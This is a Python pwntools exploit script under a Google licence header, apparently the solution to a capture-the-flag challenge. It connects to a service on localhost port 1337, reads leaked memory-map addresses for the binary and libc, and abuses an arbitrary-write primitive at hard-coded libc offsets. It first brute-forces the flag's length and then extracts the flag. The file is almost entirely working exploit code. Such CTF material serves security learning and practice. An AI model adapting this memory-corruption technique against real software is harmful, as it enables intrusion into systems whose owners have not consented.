# Copyright 2023 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *
# For a different libc chance exit_base, first_ret and far_ret
port = 1337
def remote_write(r,address,length):
	#print("Writing",hex(address) + " " + str(length))
	r.send(hex(address) + " " + str(length))
	sleep(.001)

r = remote('localhost',port)
sleep(.1)
#input("Waiting")
output = r.recv()
print("Received",output)
binary_base = int(output.split(b"\n")[2].split(b'-')[0],16)
libc_base = int(output.split(b"\n")[9].split(b'-')[0],16)

def libc_write(r,offset,length):
	remote_write(r,libc_base + offset,length)

print("Binary base",hex(binary_base))
print("libc base",hex(libc_base))

exit_base = 0x455f0
#exit_base = 0x000000000003e590
first_ret = 0x45680
#first_ret = 0x3e5f2

# Figure out flag length
flag_char_map = {}
flag_char_map['C'] = 0
flag_char_map['T'] = 1
flag_char_map['F'] = 2
flag_char_map['{'] = 3

def write_character(r,c,address):
	if isinstance(c,int):
		remote_write(r,address -c,c + 1)
	else:
		remote_write(r,address - flag_char_map[c],flag_char_map[c] + 1)
def try_flag_length(r,length):
	print("Trying length",length)
	flag_char_map['}'] = length - 1
	flag_char_map['\0'] = length
	for i in range(first_ret - 1 , exit_base - 1, -2):
		write_character(r,'\0',libc_base + i)
	try:
		r.send("finish")
		return r.recv()
	except EOFError:
		return "fail"
for i in range(124,0,-1):
	output = try_flag_length(r,i)
	r.close()
	r = remote('localhost',port)
	sleep(.01)
	r.recv()
	print(output)
	if output != "fail":
		break
else:
	print("Could not get length")
	exit(1)
print("Length is",flag_char_map['\0'])
r.close()
r = remote('localhost',port)
sleep(.01)
r.recv()
input()
remote_write(r,binary_base + 0x218e,126)
for i in range(first_ret - 1 , exit_base - 1, -2):
		write_character(r,'\0',libc_base + i)
print("Writing at",hex(binary_base + 0x218e))
#input()

r.send("finish")
print(r.recv())
